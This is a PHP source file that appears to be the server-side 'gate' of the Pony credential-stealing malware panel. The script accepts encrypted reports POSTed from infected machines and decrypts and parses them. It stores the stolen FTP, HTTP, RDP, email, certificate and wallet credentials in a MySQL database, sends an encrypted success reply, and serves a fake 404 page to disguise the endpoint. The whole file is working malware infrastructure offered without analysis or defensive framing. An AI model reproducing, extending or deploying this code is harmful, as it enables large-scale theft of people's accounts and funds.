<?php

// turn off all error reporting
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

// make sure included files do not generate extra output
ob_start();

if (!isset($proxy_config))
{
    // use local config file
	$config_file = "config.php";
} else
{
	// use proxy config file
	$config_file = $proxy_config;
}

file_exists($config_file) or die();

require_once($config_file);
require_once('includes/misc.php');
require_once('includes/password_modules.php');
require_once('includes/database.php');

// clean output buffer
ob_end_clean();

// connect and validate database
$pony_db = new pony_db();
$pony_db->connect_db($mysql_host, $mysql_user, $mysql_pass, $mysql_database, false);

// set report decryption password
$pony_db_report_password = $pony_db->get_option('report_password', '', REPORT_DEFAULT_PASSWORD);
// set report parsing options
$pony_report_options = array('sftp_user' => $pony_db->get_option('sftp_user', '', '1'),
							 'sftp_port' => $pony_db->get_option('sftp_port', '', '1'),
							 'sftp_protocol' => $pony_db->get_option('sftp_protocol', '', '1'));

// default values for unset config variables
if (!isset($enable_http_mode))
	$enable_http_mode = false;
if (!isset($enable_email_mode))
	$enable_email_mode = false;

// client IP
$ip = get_client_ip();

// get report data
$real_length = intval($_SERVER['CONTENT_LENGTH']);
$received_report_data = file_get_contents('php://input');

// check if data was received in full
if ($real_length !== strlen($received_report_data))
	die();

$report_id = 0;

// report data length should be inbetween 12 bytes and 900 Kb (default mysql query max. length)
$max_db_len_size = 1024*900;
if (strlen($received_report_data) > 12 && strlen($received_report_data) <= $max_db_len_size)
{
	if (report_parser::verify_report_file_header($received_report_data))
	{
		$report_status_ok = false;
		$ip_country = geo_ip_country_code($ip);
		$report_new_encryption = false;

		// check if new random encryption is used
		if (report_parser::verify_new_file_header($received_report_data))
		{
			$report_new_encryption = true;
		}
		
		if (report_parser::check_report_crypted_header($received_report_data) || report_parser::verify_new_file_header($received_report_data))
		{
			// try to pre-decrypt report data
			report_parser::pre_decrypt_report($received_report_data, $pony_db_report_password);
		}

		// add non parsed report
	    $report_id = $pony_db->add_nonparsed_report($ip, $ip_country, $received_report_data);
	
		if ($report_id)
		{
			// there's new report available for parsing
			$report = new report_parser($pony_report_options);

			// process report
			ob_start(); // detect report processing noise
			error_reporting(E_ALL);
			$parse_result = $report->process_report($received_report_data, $pony_db_report_password);
			$ob_data = trim(ob_get_contents());
			error_reporting(0);
			ob_end_clean();

			if ($parse_result)
			{
				$report_status_ok = true;

				if ($enable_http_mode)
					$url_list_array = array_merge($report->ftp_lines, $report->http_lines);
				else
					$url_list_array = $report->ftp_lines;

				$url_list_array = array_merge($url_list_array, $report->rdp_lines);

				if ($enable_email_mode)
				{
					$email_lines = $report->email_lines;
				}
				else
				{
					$email_lines = null;
				}

				$pony_db->update_parsed_report($report_id, $report->report_os_name, $report->report_is_win64, $report->report_is_admin, 
					$report->report_hwid, $report->report_version_id, $url_list_array, $report->log->log_lines, $report->cert_lines, $report->wallet_lines, $email_lines);

				if (strlen($ob_data))
				{
					$pony_db->add_log_line('ERR_EXTRA_NOISE: '.$ob_data, CLOG_SOURCE_REPORT, $report_id, $log_extra);
				}
			} else
			{
				// parse error, write logs
				$log = $report->log->log_lines;
				$pony_db->import_log_list($log, CLOG_SOURCE_REPORT, $report_id);
			}
		} else if ($pony_db->state)
		{
			$report_status_ok = true;
			$pony_db->add_log_line('NOTIFY_GATE_DUPLICATE_REPORT', CLOG_SOURCE_GATE, null, $ip);
		}

	    // check report parsing state and return success status for the client
		if ($report_status_ok)
		{
			$response_msg = 'STATUS-IMPORT-OK';
			if	($report_new_encryption)
				$response_msg = rc4_rand_crypt($response_msg);
			echo $response_msg;
		}
	}
} else
{
	if (strlen($received_report_data) == 0)
	{
		// received empty report
		// return 404
		$pony_db->add_log_line('NOTIFY_GATE_RECEIVED_NULL_REPORT', CLOG_SOURCE_GATE, null, $ip);
		header('HTTP/1.0 404 Not Found');
		header('Status: 404 Not Found');
		$_SERVER['REDIRECT_STATUS'] = 404;
		if (file_exists('404.html'))
			echo file_get_contents('404.html');
		die();
	}
	else if (strlen($received_report_data) < 12 && strlen($received_report_data) > 1)
		$pony_db->add_log_line('ERR_GATE_REPORT_WRONG_SIZE: '.strlen($received_report_data), CLOG_SOURCE_GATE, null, $ip);
	else if (strlen($received_report_data) > $max_db_len_size)
		$pony_db->add_log_line('ERR_GATE_REPORT_BIG_SIZE: '.strlen($received_report_data), CLOG_SOURCE_GATE, null, $ip);
}

